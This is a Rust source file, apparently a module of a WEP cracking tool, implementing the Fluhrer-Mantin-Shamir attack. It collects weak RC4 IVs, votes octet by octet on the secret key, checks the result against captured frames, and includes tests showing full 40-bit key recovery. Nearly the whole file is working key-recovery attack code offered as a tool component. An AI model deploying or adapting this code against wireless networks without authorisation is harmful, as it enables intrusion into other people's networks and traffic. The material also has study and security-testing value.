//! The Fluhrer-Mantin-Shamir attack (FR-ATK-KOREK-1, the FMS half).
//!
//! FMS recovers the secret key one octet at a time from "weak" IVs of the form
//! `(3 + b, 0xFF, X)` when attacking secret octet `b`. For each weak IV we run
//! the KSA forward over the known prefix `IV || secret[0..b]`, then the first
//! keystream octet predicts `secret[b]` via the resolved condition
//! `secret[b] = Sinv[z] - S[A] - j  (mod 256)` where `A = 3 + b` and `S`, `j`,
//! `Sinv` are the KSA state after `A` steps. Votes accumulate; the most-voted
//! value per octet is the recovered octet. From the paper "Weaknesses in the Key
//! Scheduling Algorithm of RC4" (Fluhrer, Mantin, Shamir, 2001).
#![allow(
    clippy::indexing_slicing,
    clippy::cast_possible_truncation,
    reason = "byte-permute KSA over a 256-octet state indexed by u8-derived values in range by construction"
)]

use super::{Attack, argmax};
use crate::model::{BssidWep, IvSample, KeyLen, WepKey};
use crate::wep::Verifier;

/// First IV octet of an FMS weak IV is `3 + b`; second is this sentinel.
const FMS_IV1: u8 = 0xFF;

/// The FMS statistical attack.
#[derive(Debug, Clone, Copy)]
pub struct FmsAttack;

impl Attack for FmsAttack {
    fn name(&self) -> &'static str {
        "fms"
    }

    fn applicable(&self, bssid: &BssidWep, len: KeyLen) -> bool {
        super::unique_iv_count(bssid) >= super::min_samples(len)
    }

    fn run(&self, bssid: &BssidWep, len: KeyLen, verifier: &Verifier) -> Option<WepKey> {
        let secret = recover(bssid.ivs(), len.byte_len());
        let key = WepKey::new(&secret)?;
        verifier.accept(&key).then_some(key)
    }
}

/// Recover the `keylen`-octet secret by FMS voting, octet by octet.
fn recover(ivs: &[IvSample], keylen: usize) -> Vec<u8> {
    // Distinct IVs only -- a reused weak IV repeats its vote and biases the count.
    let samples = super::unique_samples(ivs, &[]);
    let mut secret = vec![0u8; keylen];
    for b in 0..keylen {
        let target_iv0 = (3 + b) as u8;
        let mut votes = [0u32; 256];
        for sample in &samples {
            if sample.iv[0] != target_iv0 || sample.iv[1] != FMS_IV1 || sample.ks_len == 0 {
                continue;
            }
            let z = sample.keystream()[0];
            votes[usize::from(fms_predict(sample.iv, &secret, b, z))] += 1;
        }
        secret[b] = argmax(&votes);
    }
    secret
}

/// One FMS prediction of `secret[byte]` from a weak IV and the first keystream octet `ks0`.
fn fms_predict(iv: [u8; 3], secret: &[u8], byte: usize, ks0: u8) -> u8 {
    let key_idx = 3 + byte; // full-key index of the octet under attack
    // KSA forward over the known prefix IV || secret[0..byte] (steps 0..key_idx-1).
    let mut state: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j = 0u8;
    for i in 0..key_idx {
        let k = if i < 3 { iv[i] } else { secret[i - 3] };
        j = j.wrapping_add(state[i]).wrapping_add(k);
        state.swap(i, usize::from(j));
    }
    // Resolved condition: secret[byte] = Sinv[ks0] - S[key_idx] - j (mod 256).
    let sinv = state.iter().position(|&v| v == ks0).unwrap_or(0) as u8;
    sinv.wrapping_sub(state[key_idx]).wrapping_sub(j)
}

#[cfg(test)]
mod tests {
    use super::{FmsAttack, recover};
    use crate::attack::Attack;
    use crate::crypto::{Rc4, crc32};
    use crate::model::{BssidWep, EncFrame, IvSample, KeyLen, WepKey};
    use crate::wep::Verifier;

    /// Generate the FMS weak IVs `(3+b, 0xFF, x)` for a known key, with the true
    /// first keystream octet (what the SNAP harvest yields).
    fn weak_ivs(key: &[u8], per_byte: u16) -> Vec<IvSample> {
        let mut ivs = Vec::new();
        for b in 0..key.len() as u8 {
            for x in 0..per_byte {
                let iv = [3 + b, 0xFF, x as u8];
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                let mut ks = [0u8; 1];
                Rc4::new(&seed).keystream(&mut ks);
                ivs.push(IvSample::new(iv, &ks));
            }
        }
        ivs
    }

    fn verifier_for(key: &[u8]) -> Verifier {
        let frames = [[1u8, 2, 3], [4, 5, 6]]
            .iter()
            .map(|iv| {
                let plain = b"\xaa\xaa\x03\x00\x00\x00 verifier frame body";
                let mut data = plain.to_vec();
                data.extend_from_slice(&crc32(plain).to_le_bytes());
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                Rc4::new(&seed).apply_keystream(&mut data);
                EncFrame { iv: *iv, data, key_id: 0 }
            })
            .collect();
        Verifier::new(frames)
    }

    #[test]
    fn fms_recovers_wep40() {
        let key = [0x12u8, 0x34, 0x56, 0x78, 0x9a];
        // All 256 IVs of each weak class -> a clean argmax signal.
        assert_eq!(recover(&weak_ivs(&key, 256), 5), key.to_vec());
    }

    #[test]
    fn fms_end_to_end_via_attack() {
        let key = [0xa1u8, 0xb2, 0xc3, 0xd4, 0xe5];
        let bssid =
            BssidWep::with_material(crate::model::WepMaterial { ivs: weak_ivs(&key, 256), ..Default::default() });
        let recovered = FmsAttack.run(&bssid, KeyLen::Wep40, &verifier_for(&key));
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }
}
